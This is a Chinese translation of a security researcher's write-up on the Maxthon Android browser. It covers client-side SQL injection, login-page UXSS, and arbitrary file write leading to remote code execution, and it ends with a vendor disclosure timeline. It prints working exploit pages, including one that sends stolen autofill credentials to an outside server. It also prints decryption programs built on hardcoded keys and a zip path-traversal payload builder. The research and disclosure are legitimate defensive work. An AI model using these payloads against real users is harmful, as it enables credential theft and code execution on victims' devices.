接[上篇](http://paper.seebug.org/107/)，本篇翻译自原文后部分，本文有增改

原文：http://d3adend.org/blog/?p=851

原作者： **Neil Bergman**

译： **Holic (知道创宇404安全实验室)**

* * *

### 寻找客户端 SQL 注入漏洞

目前为止我们已经使用 `catchform` 方法来利用 UXSS 漏洞，但是利用暴露的 `catchform` 方法在
`mxbrowser_default` 数据库中触发客户端 SQL 注入也是可行的，这可以远程破坏数据库的完整性和机密性。

考虑到下面的代码取自 `com.mx.browser.a.f` 类。当域的用户名/密码行不存在时，使用参数化的 SQL
语句将数据插入本地数据库。当该域的用户名/密码行已经存在时，使用动态字符串链接构建 UPDATE SQL 语句。恶意网页控制 `b` 变量（用户名）和
`a` 变量（host），但不直接控制 `c` 变量（密码），因为密码是被加密编码过的。

    
    
            Cursor v1;
            SQLiteDatabase v0 = g.a().d();
            String v2 = "select * from mxautofill where host =?";
            h.f();
            try {
                v1 = v0.rawQuery(v2, new String[]{this.a});
                if(v1.getCount() <= 0) {
                    ContentValues v2_1 = new ContentValues();
                    v2_1.put("host", this.a);
                    v2_1.put("username", this.b);
                    v2_1.put("password", this.c);
                    v0.insert("mxautofill", null, v2_1);
                }
                else {
                    v1.moveToFirst();
                    v1.getColumnIndexOrThrow("host");
                    v2 = "update mxautofill set username = \'" + this.b + "\',passwrd = \'" + this.c + "\' where host = \'" + this.a + "\'";
                    h.f();
                    v0.execSQL(v2);
                }
            }

### 通过 SQL 注入篡改数据库，在所有保存过的域下触发登录页面 UXSS

考虑到我们能够注入的 SQL 语句是一个 UPDATE 语句，作用是更改一个域下的填充信息，可以想到最简单的利用方法便是操纵 UPDATE
语句篡改所有保存的自动填充信息，配合设计好的数据来利用登录页面 UXSS 漏洞。这个漏洞可以让我们在每个受害者常用的登录页面注入
JavaScript（假设受害者使用自动填充功能）。

我构建了以下 HTML 页面，通过调用 `catchform` 方法来利用 SQL
漏洞。注意我们利用漏洞必须尝试使用浏览器之前存储的信息来自动填充信息，因为 SQL 注入与 UPDATE 语句相关联，而不是最初的 INSERT
语句。因此攻击者可能选择流行的 URL 作为 `documentURI` 的值。

    
    
    <html>
    <body>
    <script>
    var json = '{"documentURI":"https://accounts.google.com/","inputs":[{"id":"username","name":"username","value":"loginsqltest@gmail.com\'\'-alert(\'\'SqlTest:\'\'+document.domain)-\'\'\'--"},{"id":"password","name":"password","value":"fakepassword"}]}';
    mxautofill.catchform(json);
    </script>
    </body>
    </html>

当用户访问恶意页面时，会提示用户“save your account？”，并且用户必须在 SQL 注入漏洞被利用之前点击 “Yes”。

![](https://images.seebug.org/content/images/2016/11/mxSqlCorrupt1-5839.png-w331s)

—— 一些用户交互

然后浏览器执行以下 SQL 语句。请注意，我们在用户名字段注入我们的 JavaScript，然后使用 SQL 注入注释掉其它的 SQL 语句，包括
WHERE 子语句，以便将更新限制为只有一行。

    
    
    update mxautofill set username = 'loginsqltest@gmail.com''-alert(''SqlTest:''+document.domain)-'''-- ',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'

检测设备上的 SQLite 数据库我们看到我们已经成功更新了 mxautofill 表中的所有行。

![](https://images.seebug.org/content/images/2016/11/mxSqlCorrupt3-5839.png-w331s)

—— 本地 SQLite 数据库已被篡改

下一次，当受害者访问存储自动填充信息的域名之一的登录页面时，我们的 JavaScript 代码通过 WebView 的 `loadUrl` 方法执行。

    
    
    javascript:mx_form_fill('loginsqltest@gmail.com'-alert('SqlTest:'+document.domain)-'','fakepassword')

![](https://images.seebug.org/content/images/2016/11/mxSqlCorrupt2-5839.png-w331s)

—— 当受害者浏览 Twitter 或者 Google 的登录页面时 ，JS payload 得以触发

### 使用 SQL 注入和登录页面 UXSS 提取敏感数据

如果我们要从`mxautofill`表远程提取所有的用户名和加密密码怎么办？我构造了以下 HTML 页面利用 SQL
漏洞实现了目标。基本上，我们将使用内部查询构建一个 JavaScript 字符串，其中包括存储在表中的所有主机，用户名和加密过的密码。然后我们使用登录页面
UXSS 漏洞和 AJAX 从设备窃取信息。

    
    
    <html>
    <body>
    <script>
    var json = '{"documentURI":"https://accounts.google.com/","inputs":[{"id":"username","name":"username","value":"\'\');var request=new XMLHttpRequest();dataToSteal=\'\'\'||(SELECT GROUP_CONCAT(host||\':\'||username||\':\'||password) from mxautofill)||\'\'\';request.open(\'\'GET\'\',\'\'http://d3adend.org/c.php?c=\'\'+dataToSteal,false);request.send();//\'--"},{"id":"password","name":"password","value":"fakepassword"}]}';
    mxautofill.catchform(json);
    </script>
    </body>
    </html>

当用户访问恶意页面时，会提示用户“sava your account？”，而且 利用SQL 注入漏洞之前用户必须点击“Yes”。

![](https://images.seebug.org/content/images/2016/11/maxSqlInjectExfil5403-0.png-w331s)

—— 点击“Yes”

浏览器接下来会执行以下 SQL 语句。

    
    
    update mxautofill set username = ''');var request=new XMLHttpRequest();dataToSteal='''||(SELECT GROUP_CONCAT(host||':'||username||':'||password) from mxautofill)||''';request.open(''GET'',''http://d3adend.org/c.php?c=''+dataToSteal,false);request.send();//'--',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'

mxautofill 表中的所有行都已经在客户端数据库中更新。

![](http://d3adend.org/android/max/maxSqlInjectExfil5403-1.png)

—— 所有记录都均被修改

当受害者访问有自动填充信息的域登录页面时，我们的 JavaScript 代码得以执行。在实际使用过程中， `dataToSteal`
变量将包含真实的账户凭据。

    
    
    javascript:mx_form_fill('');var request=new XMLHttpRequest(); dataToSteal='acccount_1_hostname:account_1_username:account_1_encrypted_password, acccount_2_hostname:account_2_username:account_2_encrypted_password,etc.'; request.open('GET','http://d3adend.org/c.php?c='+dataToSteal,false);request.send();//'','fakepassword')

![](http://d3adend.org/android/max/maxSqlInjectExfil5403-2.png)

—— 不可见的漏洞利用得以执行

![](http://d3adend.org/android/max/maxSqlInjectExfil5403-3.png) ——
域名，用户名和加密的密码通过 AJAX 发送到攻击者控制的服务器。

因此，我们现在有了来自受害者的 mxautofill 表的主机名，用户名和加密密码，但我们需要解密密钥。为了获取加密密钥，我仅使用了一个自定义的
Xposed 模块在两个不同的设备上来 hook 一个与自动填充功能相关的加密方法调用。在两个设备上， Maxthon
使用了相同的硬编码密钥（“eu3o4[r04cml4eir”）进行密码存储。

几个月后，我抱着一丝希望搜索了 “eu3o4[r04cml4eir”，却发现了 Exatel 的一些有趣的关于 windows 版本的 Maxthon
的[隐私安全研究](https://exatel.pl/advisory/maxthonreporten.pdf)。他们的结论是“整个用户的网站浏览历史会到达位于北京的
Maxthon 作者的服务器，还包括所有输入的 Google 搜索记录”。浏览器的桌面版本使用相同的加密密钥加密用户的浏览历史，正如我在 Android
版本所发现的那样。开发者团队在面对用户时并[不承认任何错误](http://forum.maxthon.com/index.php?/topic/18513-maxthon-permission-violation/)， CEO 随后发表[声明](http://news.softpedia.com/news/maxthon-browser-collects-sensitive-data-even-if-users-opt-out-506327.shtml)。

“Exatel 还报告说，Maxthon 将 URL 发送回其服务器。正如所有 URL 的安全检查工作，Maxthon 的云安全扫描模块（cloud
secure）检测用户所访问的网站的安全性。通过执行 URL 安全检测，Maxthon 向其服务器发送 URL
以检测网站是否安全。由于这些安全检查的存在，自2005年以来我们已经阻止了用户访问数百万的虚假网站和恶意网站。在我们的最新版本中，我们将添加一个选项，可供用户关闭扫描模块。”

> (原文)
>
> “Exatel also reported that Maxthon sends URLs back to its server. Just as
> all URL security checks work, Maxthon’s cloud security scanner module (cloud
> secure) checks the safety of the websites our users visit. By implementing
> this URL security check, Maxthon sends URLs to its server to check if the
> website is safe or not. As a result of these security checks, we have
> prevented our users from visiting millions of fake and malicious websites
> since 2005. In our latest version, we will add an option for users to turn
> off the scanner.”

我不确定我相信这个功能实际上实际上是一个“云安全扫描器”，像 CEO 声称，但不管其意图，通过 HTTP
使用硬编码密钥发送加密的浏览器历史纪录可不是个好主意。在 Android 的版本的浏览器中，我还发现了类似的功能在
`com.mx.browser.statistics.z` 类中。这里需要注意，以下代码将加密的“统计”数据发送到同一个 URL ，并且像 Exatel
的研究中显示的那样使用相同的加密密钥。

    
    
    final class z extends AsyncTask {
        z(PlayCampaignReceiver arg1, String arg2) {
            this.b = arg1;
            this.a = arg2;
            super();
        }
    
        private Void a() {
            JSONObject v0 = new JSONObject();
            try {
                v0.put("l", ch.r);
                v0.put("sv", ch.e);
                v0.put("cv", ch.l);
                v0.put("pn", ch.g);
                v0.put("d", ch.e());
                v0.put("pt", "gp_install");
                v0.put("m", "main");
                JSONObject v1 = new JSONObject();
                v1.put("imei", ch.m);
                v1.put("refer", this.a);
                v1.put("aid", ch.n);
                v1.put("model", ch.p);
                v1.put("mac", ch.u);
                v0.put("data", v1);
                new StringBuilder("before = ").append(v0).toString();
                String v0_3 = Uri.encode(new String(Base64.encode(a.a(v0.toString(), "eu3o4[r04cml4eir"), 2), "UTF-8"));
                new StringBuilder("after urlencode =").append(v0_3).toString();
                y v1_1 = new y();
                v0_3 = "http://g.dcs.maxthon.com/mx4/enc?keyid=default&data=" + v0_3;
                new StringBuilder("url=").append(v0_3).append(";response = ").append(v1_1.a(v0_3, 3).getStatusLine().getStatusCode()).toString();
            }

反正已经跑题了。那就干脆把通过客户端 SQL 注入和登陆页面 UXSS 漏洞获取的密码给破解了吧。在写出加密算法，加密模式和密钥之后，我写了以下简单的
Java 程序。

    
    
    import java.util.Base64;
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    
    public class MaxDecrypt {
        public static void main(String[] args) throws Exception {
            String rawUserDataArg = args[0];
            System.out.println("");
            if(rawUserDataArg != null) {
                String[] rawUserDataArray = rawUserDataArg.split(",");
                for(String rawUserData : rawUserDataArray) {
                    String host = rawUserData.split(":")[0];
                    String username = rawUserData.split(":")[1];
                    String encryptedPassword = rawUserData.split(":")[2];
                    String decryptedPassword = decrypt(encryptedPassword);
    
                    System.out.println("====================================");
                    System.out.println("Host: " + host);
                    System.out.println("Username: " + username);
                    System.out.println("Password: " + decryptedPassword);
                }
                System.out.println("====================================");
            }
        }
    
        public static String decrypt(String ciphertext) throws Exception {
            SecretKeySpec sks = new SecretKeySpec("eu3o4[r04cml4eir".getBytes("UTF-8"), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
            Base64.Decoder decoder = Base64.getDecoder();
            byte[] ciphertextBytes = decoder.decode(ciphertext);
            cipher.init(Cipher.DECRYPT_MODE, sks);
            byte[] plaintextBytes = cipher.doFinal(ciphertextBytes);
            return new String(plaintextBytes);
        }
    }

![](http://d3adend.org/android/max/maxSqlInjectExfil5403-4.png)

—— 解密获取到的凭据

### 任意文件写入漏洞 - 越过远程执行代码的障碍

一般来说，在 Android 操作系统中，非特权应用的任意文件写入漏洞很难变成远程代码执行。

1） 应用程序主要 dex 代码，或 OAT 进程的输出由系统用户所有，因此在正常情况下不应该覆盖此代码。

2） 应用程序的存储 ELF 共享对象的 lib 目录，实际上是一个链接到所有者为系统用户目录，所以正常情况下不太可能覆盖这些代码。

话虽如此，在很多情况下，任意文件写入漏洞可以很容易地变成远程代码执行漏洞。

1）目标应用程序通过
[DexClassLoader](https://developer.android.com/reference/dalvik/system/DexClassLoader.html)
类执行动态类加载，并且可以覆盖存储的dex代码。

2）目标应用程序不正确存储其ELF共享对象文件，使得这些文件不属于系统用户。 [Jake Van
Dyke](https://www.nowsecure.com/blog/2015/08/10/world-writable-code-is-bad-mmmmkay-4/) 和 [rotlogix](http://rotlogix.com/2015/10/11/mercury-browser-for-android-rce-redux/) 都提到了 SO 全局可写的应用范例，这允许根据情况进行本地或远程利用。

3） 目标应用程序以 [系统用户权限运行](https://www.nowsecure.com/blog/2015/06/16/remote-code-execution-as-system-user-on-samsung-phones/)。

4） 目标应用程序是 [multidex 应用](https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/)，且不在使用 ART 运行环境的设备上运行。

我最初确定这些漏洞时我不相信这些条件有那条成立，但几个月后，当一个较新版本的发布时，我注意到一些新的软件包被添加到代码库，包括
`com.igexin.`。这显然是一个被赛门铁克标记为[不需要的应用程序](https://www.symantec.com/security_response/writeup.jsp?docid=2015-032606-5519-99&tabid=2)的广告库，其绑定了一些会收集用户信息的
Android 应用，而且应用会把这些信息发送到服务器。事实证明，这个广告使用了 `DexClassLoader`
类执行加密代码的动态库加载，所以我们可以利用这个功能，通过任意文件写入漏洞来实现远程代码执行。

在新版本的浏览器中，我注意到 `/data/data/com.mx.browser/files` 目录中看起来很奇怪的新文件，如
`tdata_qiz011`，`tdata_qiz011.dex`，`tdata_rqS304`和 `tdata_rqS304.dex`。
注意虽然文件名看起来貌似随机生成，在多个设备上安装应用程序后，我注意到文件名不是根据设备特定生成的。

![](http://d3adend.org/android/max/dexFile0.png)

—— 包含优化 dex 文件的可疑文件

![](http://d3adend.org/android/max/dexFile1.png)

—— 未知的文件格式和优化的 dex 文件

我决定调查 `tdata_rqS304` 里面有什么东西。我怀疑这是一个加密的 JAR/APK 文件，但我不确定。

![](http://d3adend.org/android/max/dexFile2.png)

—— 加密过的 APK/JAR ？

执行动态类加载的代码位于 `com.igexin.push.extension.a` 类中。代码似乎加载了一个文件，比如 `tdata_rqS04`
，解密到一个 JAR 文件，如 `tdata_reS304.jar` ，从 JAR 文件中加载一个类，创建一个类的实例（调用构造函数），然后删除原 JAR
文件（使其逆向工程中隐藏）。我猜测 `com.igexin.a.a.a.a.a` 是解密方法。

    
    
        public boolean a(Context arg10, String arg11, String arg12, String arg13, String arg14) {
            Class v0_1;
            File v2 = new File(arg11);
            File v3 = new File(arg11 + ".jar");
            File v4 = new File(arg10.getFilesDir().getAbsolutePath() + "/" + arg14 + ".dex");
            this.a(v2, v3, arg13);
    
            if(v3.exists()) {
                try {
                    DexClassLoader v2_1 = new DexClassLoader(v3.getAbsolutePath(), arg10.getFilesDir().getAbsolutePath(), null, arg10.getClassLoader());
                    try {
                        v0_1 = v2_1.loadClass(arg12);
                    }
                    catch(Exception v2_2) {
                    }
                }
                catch(Throwable v0) {
                    goto label_74;
                }
    
                try {
                    v3.delete();
                    v4.exists();
                    if(v0_1 == null) {
                        boolean v0_2 = false;
                        return v0_2;
                    }
    
                    Object v0_3 = v0_1.newInstance();
    ...
        public void a(File arg10, File arg11, String arg12) {
            BufferedOutputStream v1_5;
            Throwable v8;
            int v1_1;
            FileInputStream v2;
            BufferedOutputStream v0_2;
            FileOutputStream v2_1;
            FileInputStream v3;
            FileOutputStream v1 = null;
            try {
                v3 = new FileInputStream(arg10);
            }
            catch(Throwable v0) {
                v2_1 = v1;
                v3 = ((FileInputStream)v1);
                goto label_45;
            }
            catch(Exception v0_1) {
                v0_2 = ((BufferedOutputStream)v1);
                v2 = ((FileInputStream)v1);
                goto label_22;
            }
    
            try {
                v2_1 = new FileOutputStream(arg11);
            }
            catch(Throwable v0) {
                v2_1 = v1;
                goto label_45;
            }
            catch(Exception v0_1) {
                v0_2 = ((BufferedOutputStream)v1);
                v2 = v3;
                goto label_22;
            }
    
            try {
                v0_2 = new BufferedOutputStream(((OutputStream)v2_1));
                v1_1 = 1024;
            }
            catch(Throwable v0) {
                goto label_45;
            }
            catch(Exception v0_1) {
                v0_2 = ((BufferedOutputStream)v1_1);
                v1 = v2_1;
                v2 = v3;
                goto label_22;
            }
    
            try {
                byte[] v1_4 = new byte[v1_1];
                while(true) {
                    int v4 = v3.read(v1_4);
                    if(v4 == -1) {
                        break;
                    }
    
                    byte[] v5 = new byte[v4];
                    System.arraycopy(v1_4, 0, v5, 0, v4);
                    v0_2.write(com.igexin.a.a.a.a.a(v5, arg12));
                }

`com.igenxin.a.a.a.a` 类使用本地加密算法执行解密。输入验证至关重要（"key is fail!"）。

    
    
    package com.igexin.a.a.a;
    
    public class a {
        public static void a(int[] arg2, int arg3, int arg4) {
            int v0 = arg2[arg3];
            arg2[arg3] = arg2[arg4];
            arg2[arg4] = v0;
        }
    
        public static boolean a(byte[] arg6) {
            boolean v0_1;
            int v3 = arg6.length;
            if(v3  256) {
                v0_1 = false;
            }
            else {
                int v2 = 0;
                int v0 = 0;
                while(v2  3) {
                            v0_1 = false;
                            return v0_1;
                        }
                    }
    
                    ++v2;
                }
    
                v0_1 = true;
            }
    
            return v0_1;
        }
    
        public static byte[] a(byte[] arg1, String arg2) {
            return a.a(arg1, arg2.getBytes());
        }
    
        public static byte[] a(byte[] arg7, byte[] arg8) {
            int v1 = 0;
            if(!a.a(arg8)) {
                throw new IllegalArgumentException("key is fail!");
            }
    
            if(arg7.length <= 0) {
                throw new IllegalArgumentException("data is fail!");
            }
    
            int[] v3 = new int[256];
            int v0;
            for(v0 = 0; v0 < v3.length; ++v0) {
                v3[v0] = v0;
            }
    
            v0 = 0;
            int v2 = 0;
            while(v0 < v3.length) {
                v2 = (v2 + v3[v0] + (arg8[v0 % arg8.length] & 255)) % 256;
                a.a(v3, v0, v2);
                ++v0;
            }
    
            byte[] v4 = new byte[arg7.length];
            v0 = 0;
            v2 = 0;
            while(v1 < v4.length) {
                v0 = (v0 + 1) % 256;
                v2 = (v2 + v3[v0]) % 256;
                a.a(v3, v0, v2);
                v4[v1] = ((byte)(v3[(v3[v0] + v3[v2]) % 256] ^ arg7[v1]));
                ++v1;
            }
    
            return v4;
        }
    
        public static byte[] b(byte[] arg1, String arg2) {
            return a.a(arg1, arg2.getBytes());
        }
    }

所以现在我们知道如何揭秘 JAR 文件了，但是我们需要知道加密密钥。我又通过 Xposed
使用了模块动态分析来却id那个每个文件使用了哪个加密密钥以及加载了哪个类。以下是我从 `tdata_rqS304`
文件中获取到的信息。我还在不同设备验证了加密密钥不是针对特定设备的。例如，加密库使用“5f8286ee3424bed2b71f66d996b247b8”作为密钥来解密
`tdata_rqS304` 文件。

    
    
    Method Caller: com.igexin.push.extension.a@420bfd48
    Argument Types: com.igexin.sdk.PushService, java.lang.String, java.lang.String, java.lang.String, java.lang.String
    Argument 0: com.igexin.sdk.PushService@420435b8
    Argument 1: /data/data/com.mx.browser/files/tdata_rqS304
    Argument 2: com.igexin.push.extension.distribution.basic.stub.PushExtension
    Argument 3: 5f8286ee3424bed2b71f66d996b247b8
    Argument 4: tdata_rqS304

现在我们用于了解密文件并检查 JAR 文件的所有信息。以下 Java 程序将揭秘 `tdata_rqS304` 文件。

    
    
    import java.util.Base64;
    import javax.crypto.Cipher;
    import javax.crypto.spec.SecretKeySpec;
    import java.io.*;
    
    public class MaxDexDecrypt {
        public static void main(String[] args) throws Exception {
            String ciphertextFilename = "tdata_rqS304";
            String plaintextFilename = "tdata_rqS304.jar";
            String keyString = "5f8286ee3424bed2b71f66d996b247b8";
    
            File ciphertextFile = new File(ciphertextFilename);
            File plaintextFile = new File(plaintextFilename);
            decryptFile(ciphertextFile, plaintextFile, keyString);
        }
    
        public static void decryptFile(File ciphertextFile, File plaintextFile, String keyString) {
            BufferedOutputStream v1_5;
            Throwable v8;
            int v1_1;
            FileInputStream v2;
            BufferedOutputStream v0_2;
            FileOutputStream v2_1;
            FileInputStream v3;
            FileOutputStream v1 = null;
            try {
                v3 = new FileInputStream(ciphertextFile);
                v2_1 = new FileOutputStream(plaintextFile);
                v0_2 = new BufferedOutputStream(((OutputStream)v2_1));
                v1_1 = 1024;
                byte[] v1_4 = new byte[v1_1];
                while(true) {
                    int v4 = v3.read(v1_4);
                    if(v4 == -1) {
                        break;
                    }
                    byte[] v5 = new byte[v4];
                    System.arraycopy(v1_4, 0, v5, 0, v4);
                    v0_2.write(decrypt(v5, keyString));
                }
                v3.close();
                v0_2.flush();
                v0_2.close();
                v2_1.close();
                v3.close();
                v0_2.close();
                v2_1.close();
            }
            catch(Exception v0_1) {
            }
        }
    
        public static void junk(int[] arg2, int arg3, int arg4) {
            int v0 = arg2[arg3];
            arg2[arg3] = arg2[arg4];
            arg2[arg4] = v0;
        }
    
        public static byte[] decrypt(byte[] ciphertextBytes, String keyString) {
            return decrypt(ciphertextBytes, keyString.getBytes());
        }
    
        public static byte[] decrypt(byte[] ciphertextBytes, byte[] keyBytes) {
            int v1 = 0;
            int[] v3 = new int[256];
            int v0;
            for(v0 = 0; v0 < v3.length; ++v0) {
                v3[v0] = v0;
            }
    
            v0 = 0;
            int v2 = 0;
            while(v0 < v3.length) {
                v2 = (v2 + v3[v0] + (keyBytes[v0 % keyBytes.length] & 255)) % 256;
                junk(v3, v0, v2);
                ++v0;
            }
    
            byte[] v4 = new byte[ciphertextBytes.length];
            v0 = 0;
            v2 = 0;
            while(v1 < v4.length) {
                v0 = (v0 + 1) % 256;
                v2 = (v2 + v3[v0]) % 256;
                junk(v3, v0, v2);
                v4[v1] = ((byte)(v3[(v3[v0] + v3[v2]) % 256] ^ ciphertextBytes[v1]));
                ++v1;
            }
            return v4;
        }
    }

解密有效！

![](http://d3adend.org/android/max/dexFile3.png)

—— 解密成功，只是个有一些 dex 代码的 JAR 文件

![](http://d3adend.org/android/max/dexFile4.png)

—— 现在我们可以反编译代码了

### 利用任意文件写入三 - 远程代码执行

这时，所有要点聚在一起，我意识到通过任意文件写入漏洞远程执行代码是可行的。

1） 创建我们的 Java 代码然后将它编译至 APK 文件。

2） 使用 igexin 的超级 XOR 加密算法加密我们的 APK 文件，使用“5f8286ee3424bed2b71f66d996b247b8”
作为我们的加密密钥。

3） 创建一个 zip 文件，用来覆盖浏览器的 `tdata_tqS304` 文件（加密的 JAR 文件）。

4）欺骗受害者浏览一个能触发 `installWebApp` 方法的恶意页面，这会使受害者的浏览器下载并解压缩我们的zip文件。 此时，受害者的
`tdata_rqS304` 文件将替换为我们制作的文件。

5）下次浏览器再次启动时（可能在移动设备重新启动后），我们的代码将被解密，加载然后执行。

广告库从 `tdata_rqS304` 文件加载
`com.igexin.push.extension.distribution.basic.stub.PushExtension`
类，像前面说过的，我们要做的是创建一个带有以下类的 APK。

    
    
    package com.igexin.push.extension.distribution.basic.stub;
    
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    
    import android.util.Log;
    
    public class PushExtension {
    
        public PushExtension() {
            Log.wtf("MAX", "Java code execution!");
            try {
                Runtime runtime = Runtime.getRuntime();
                Process process = runtime.exec("id");
                BufferedReader stdInput = new BufferedReader(new  InputStreamReader(process.getInputStream()));
                String s = null;
                while ((s = stdInput.readLine()) != null) {
                    Log.wtf("MAX", s);
                }
            }
            catch(Exception e) { }
        }
    
    }

接下来，我们需要加密APK文件。 我们实际上可以重复使用之前开发的解密程序来执行，已经提供了本地加密算法`（dec（cipher_text，key）==
plaintext / dec（plaintext，key）== cipher_text）`。

    
    
    ...
        public static void main(String[] args) throws Exception {
            String ciphertextFilename = "exploit/MaxJunkExploit.apk";
            String plaintextFilename = "exploit/tdata_rqS304";
            String keyString = "5f8286ee3424bed2b71f66d996b247b8";
    
            File ciphertextFile = new File(ciphertextFilename);
            File plaintextFile = new File(plaintextFilename);
            decryptFile(ciphertextFile, plaintextFile, keyString);
        }
    ...

同理，我们使用 Python 代码来构建 zip 文件。

    
    
    import zipfile
    import sys
    
    if __name__ == "__main__":
        try:
            with open("tdata_rqS304", "r") as f:
                binary = f.read()
                zipFile = zipfile.ZipFile("maxFileWriteToRce9313.zip", "a", zipfile.ZIP_DEFLATED)
                zipFile.writestr("../../../../../data/data/com.mx.browser/files/tdata_rqS304", binary)
                zipFile.close()
        except IOError as e:
            raise e

然后我们制作调用 `installWebApp` 方法的 HTML 页面。

    
    
    <html>
    <body>
    <script>
    mmbrowser.installWebApp("http://d3adend.org/test/maxFileWriteToRce9313.zip");
    </script>
    </body>
    </html>

此时如果受害者使用 Maxthon 浏览器访问恶意页面，那么他们的加密 JAR 文件（tdata_rqS304)将被我们制作的 JAR 文件覆盖。

![](http://d3adend.org/android/max/max_rce0.png)

—— 校验 “webapp” 已安装

我们的 Java payload 将在下次浏览器重新启动时解密并执行。执行类加载的代码会尝试使用 `IPushExtension`
接口转换对象，该操作会失败，但是我们的代码在构造函数中已经执行，并且类加载已经代码正常处理该异常，所以浏览器工作正常不会崩溃。

![](http://d3adend.org/android/max/max_rce1.png)

—— 执行远程代码完毕

### 漏洞披露流程

  * 2/12/16 – 向厂商公开任意文件写入/远程代码执行漏洞。
  * 2/14/16 – 向厂商公开登录页 UXSS 漏洞和 SQL 注入漏洞。
  * 2/15/16 – 厂商回应说所有问题已修复。提供了本地服务器上的新 APK 的链接。
  * 2/15/16 – 要求供应商直接发送修复后的 APK ，或直接在公网服务器上提供访问。
  * 2/18/16 – 厂商提供新 APK 的公网链接。
  * 2/18/16 – 通知厂商修复程序未正确解决所有问题 (仅解决部分问题)。
  * 2/19/16 – 厂商声明他们正在研究。
  * 3/8/16 – 询问厂商的状态。
  * 3/9/16 – 厂商声明所有问题已修复，但不提供新的 APK 进行审计。
  * 5/9/16 – 厂商在 Google Play 上发布了补丁（“bugs fixed”）。
  * 5/30/16 – 通知厂商补丁并未正确解决所谓问题（此时只解决了两个问题）。
  * 5/31/16 – 厂商表示我的评论正在接受审核（自动回复）。没有后续回应。
  * 7/6/16 – 向厂商查询状态，没有回应。
  * 11/5/16 – 再一次向厂商查询状态，没有回应。

这时厂商已经不再做出响应，而且只有一些问题被修复。

  * 旧设备（<4.2）上的原创代码执行漏洞 - 并未修复。厂商标记为“不再修复”。
  * 任意文件写入，可以导致任何设备远程代码执行 - 没有修复。
  * 登录页 UXSS - 看起来是修复了（一些域名验证，但是没有对输出进行编码）
  * SQL 注入 - 看起来修复了（使用参数化的 SQL 语句）。

其中一个补丁试图根据域名限制哪些网页可以使用 `installWebApp` 方法。

    
    
    @JavascriptInterface public void installWebApp(String arg4) {
        URI v0 = URI.create(arg4);
        if((v0.getHost().endsWith("maxthon.com")) || (v0.getHost().endsWith("maxthon.cn"))) {
            String v0_1 = x.a(arg4);
            p.a(arg4, "/sdcard/webapp/" + v0_1, null);
            y.b("/sdcard/webapp/" + v0_1);
            d.b().a();
            Toast.makeText(this.mContext, "webapp installed", 1).show();
        }
    }

以前的代码有多个问题，我已多次向厂商指出。

1） 从 thisisevilmaxthon.com （以 “maxthon.com”结尾）提供的 JavaScript 仍然可以直接利用任意文件写入漏洞。

2） 该 zip 文件仍然可以通过 HTTP 提供，因此内网攻击者可以强制通过 HTTP 从 maxthon.com 下载一个 zip 文件，然后
MiTM（中间人工具）劫持流量，以间接利用任意文件写入漏洞。

### 结论

  * 远程 SQL 注入对移动应用是一件事，但是鉴于 SQLite 的限制，提取数据方面可能存在一些问题。

  * 移动应用仍在通过 JavaScript 接口暴露有趣的行为，但是我们将不得不花费更多时间逆向目标应用程序以找出安全隐患

  * 通过动态类加载进行混淆使用可能会导致意想不到的安全隐患

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/109/>

